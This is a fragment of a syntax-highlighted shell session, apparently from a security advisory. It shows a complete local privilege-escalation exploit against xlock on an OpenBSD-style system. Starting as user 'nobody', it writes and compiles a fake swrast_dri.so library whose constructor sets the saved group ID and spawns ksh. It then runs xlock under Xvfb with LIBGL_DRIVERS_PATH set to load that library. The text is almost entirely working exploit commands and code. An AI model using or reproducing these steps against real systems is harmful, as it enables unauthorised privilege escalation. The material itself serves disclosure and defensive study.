<span class="go">uid=32767(nobody) gid=32767(nobody) groups=32767(nobody)

</span><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> /tmp
<span class="go">
</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> <span class="o">&gt;</span> swrast_dri.c <span class="o">&lt;&lt;</span> <span class="sh">"</span><span class="no">EOF</span><span class="sh">"
</span><span class="gp">#</span><span class="sh">include &lt;paths.h&gt;
</span><span class="gp">#</span><span class="sh">include &lt;sys/types.h&gt;
</span><span class="gp">#</span><span class="sh">include &lt;unistd.h&gt;
</span><span class="go">
static void __attribute__ ((constructor)) _init (void) {
</span><span class="gp">    gid_t rgid, egid, sgid;</span><span class="w">
</span><span class="gp">    if (getresgid(&amp;rgid, &amp;egid, &amp;sgid) != 0) _exit(__LINE__);</span><span class="w">
</span><span class="gp">    if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);</span><span class="w">
</span><span class="go">
</span><span class="gp">    char * const argv[] = { _PATH_KSHELL, NULL };</span><span class="w">
</span><span class="gp">    execve(argv[0], argv, NULL);</span><span class="w">
</span><span class="gp">    _exit(__LINE__);</span><span class="w">
</span><span class="go">}
EOF

</span><span class="gp">$</span><span class="w"> </span>gcc <span class="nt">-fpic</span> <span class="nt">-shared</span> <span class="nt">-s</span> <span class="nt">-o</span> swrast_dri.so swrast_dri.c
<span class="go">
</span><span class="gp">$</span><span class="w"> </span><span class="nb">env</span> <span class="nt">-i</span> /usr/X11R6/bin/Xvfb :66 <span class="nt">-cc</span> 0 &amp;
<span class="go">[1] 2706

</span><span class="gp">$</span><span class="w"> </span><span class="nb">env</span> <span class="nt">-i</span> <span class="nv">LIBGL_DRIVERS_PATH</span><span class="o">=</span><span class="nb">.</span> /usr/X11R6/bin/xlock <span class="nt">-display</span> :66
<span class="go">
